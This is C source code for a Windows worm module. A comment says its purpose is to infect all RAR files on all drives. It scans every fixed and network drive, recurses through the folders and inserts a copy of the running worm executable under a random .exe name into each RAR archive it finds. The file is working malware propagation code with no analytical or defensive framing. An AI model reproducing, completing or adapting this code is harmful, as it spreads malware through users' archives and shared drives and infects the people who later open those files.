#include "stdafx.h"
#include "prototypez.h"

//module to infect all rar files on all drivers

char wormpath[MAX_PATH];

void InfectDrive()
{
	//variables
	WIN32_FIND_DATA wfd;
	HANDLE hfind;
	char fullpath[MAX_PATH];
	LPTSTR xaddr=NULL;
	char xrndstr[30];

	hfind=FindFirstFile("*.*",&wfd);

	if(hfind!=INVALID_HANDLE_VALUE)
	{
		do
		{
			if(wfd.cFileName[0]!='.')	//most not be .. or .
			{
				wfd.dwFileAttributes&=FILE_ATTRIBUTE_DIRECTORY;
				if(wfd.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY) //is directory ?
				{
					if(SetCurrentDirectory(wfd.cFileName)==TRUE)
					{
						InfectDrive();
						SetCurrentDirectory("..");	//return to upper directory
					}
				}
				else
				{
					if(GetFullPathName(wfd.cFileName,MAX_PATH,fullpath,&xaddr)!=0)
					{
						CharLower(fullpath);

						if(memcmp(fullpath+lstrlen(fullpath)-3,"rar",3)==0)
						{
							Sleep(5000);
							RandomString(xrndstr,7,TRUE);
							lstrcat(xrndstr,".exe");
							AddToRar(fullpath,wormpath,xrndstr,FILE_ATTRIBUTE_NORMAL);
						}
					}
				}
			}
		}while(FindNextFile(hfind,&wfd));
		FindClose(hfind);
	}
}

DWORD WINAPI RarWorm(LPVOID xvoid)
{
	char Drive[]="z:\\";
	UINT drive_type;

	if(GetModuleFileName(NULL,wormpath,MAX_PATH)==0)
		ExitThread(0);

	do
	{
		drive_type=GetDriveType(Drive);	
		
		if(drive_type==DRIVE_FIXED || drive_type==DRIVE_REMOTE)
		{
			if(SetCurrentDirectory(Drive)==TRUE)
				InfectDrive();	
		}

		Drive[0]--;

	}while(Drive[0]!='b');

	return 1;
}
